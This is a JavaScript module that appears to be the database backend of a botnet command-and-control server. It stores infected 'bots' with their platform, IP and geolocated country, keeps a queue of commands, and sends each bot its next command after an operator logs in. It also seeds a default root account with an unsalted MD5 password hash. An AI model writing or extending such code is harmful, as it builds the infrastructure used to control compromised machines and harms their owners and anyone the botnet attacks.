var fs = require("fs");
var file = "server.db";
var exists = fs.existsSync(file);

var sqlite3 = require("sqlite3").verbose();
var db = new sqlite3.Database(file);

var MD5 = require("crypto-js/md5");

var geoip = require("geoip-lite");

var cncDb = {
  init: function() {
    // setup our database
    db.serialize(function() {
      if ( !exists ) {
          // Create users with a default root
          db.run("CREATE TABLE Users (id integer primary key, username text, password text, email text, session text, admin integer, created datetime, updated datetime)");
          var now = Math.round(new Date().getTime() / 1000);
          db.run("INSERT INTO Users VALUES (?, ?, ?, ?, ?, ?, ?, ?)", 
              1, "root", "cc03e747a6afbbcbf8be7668acfebee5", "root@root.com", "", 1, now, now);

          // Create our list of clients
          db.run("CREATE TABLE Bots (id integer primary key, name text, botgroup text, version text, platform text, language text, bits text, localt text, ip text, country text, nextCommand text, created datetime, updated datetime)");
          db.run("CREATE TABLE Commands (id integer primary key, name TEXT, type TEXT, params TEXT, created DATETIME, updated DATETIME)");
          db.run("INSERT INTO Commands VALUES (?, ?, ?, ?, ?, ?)", 
              1, "idle", "heartbeat", "", now, now);

      }
    });
  },

  login: function(login, password, callback) {
    db.serialize(function() {
      var encryptedPassword = MD5(password).toString();
      db.all("SELECT id FROM Users WHERE username =? AND password =?", login, encryptedPassword, function(err, rows) {
        callback(rows.length);
      });
    });
  },

  install: function(name, group, version, osversion, language, bits, localtime, ip, callback) {
    db.serialize(function() {
      var geo = geoip.lookup(ip);
      var country = "??";
      if ( geo != null )
        country = geo.country;
      db.run("INSERT INTO Bots(name,botgroup,version,platform,language,bits,localt,ip,country,nextCommand,created,updated) VALUES(?,?,?,?,?,?,?,?,?,?,?,?) ", name, group, version, osversion, language, bits, localtime, ip, country, "idle", Date.now(), Date.now())
      callback();
    });
  },

  addCommand: function(name, type, params, callback) {
    db.serialize(function() {
      db.run("INSERT INTO Commands(name,type,params) VALUES(?,?,?)", name, type, params);
      callback();
    });
  },

  getCommands: function(callback) {
    db.serialize(function() {
      var commands = [];
      db.all("SELECT * FROM Commands", function(err, rows) {
        if ( err === null )
          commands = rows;
        callback(commands);
      });
    });
  },

  getBots: function(callback) {
    db.serialize(function() {
      var bots = [];
      db.all("SELECT * FROM Bots", function(err, rows) {
        if ( err === null )
          bots = rows;
        callback(bots);
      });
    });
  },

  getBot: function(name, callback) {
    db.serialize(function() {
      var bot = null;
      db.all("SELECT * FROM Bots WHERE name=?", name, function(err, rows) {
        if ( rows.length === 1 )
          bot = rows[0];
        callback(bot);
      })
    });
  },

  updateBot: function(name, command, callback) {
    db.serialize(function() {
      db.run("UPDATE Bots SET nextCommand=? WHERE name=?", command, name);
      callback();
    });
  },

  getNextCommand: function(name, callback) {

    var nextCommand = "heartbeat";
    db.serialize(function() {
      db.all("SELECT nextCommand FROM Bots WHERE name=?", name, function(err, rows) {
        if ( rows.length === 1 )
        {
          nextCommand = rows[0].nextCommand;

          db.run("UPDATE Bots SET nextCommand=? WHERE name=?", "idle", name);

          db.all("SELECT type, params FROM Commands WHERE name=?", nextCommand, function(err, rows) {
            if ( rows.length === 1 )
            {
              callback(rows[0].type + " " + rows[0].params);
            }
          });
        }
      });
    });
  },

  setSession: function(login, sessionId) {
    db.serialize(function() {
      db.run("UPDATE Users SET session=? WHERE username IS ?", sessionId, login);
    });
  },

  getSession: function(sessionId, callback) {
    db.serialize(function(){
      db.all("SELECT id FROM Users WHERE session IS ?", sessionId, function(err, rows) {
        callback(rows.length);
      });
    });
  }
}

module.exports = cncDb;
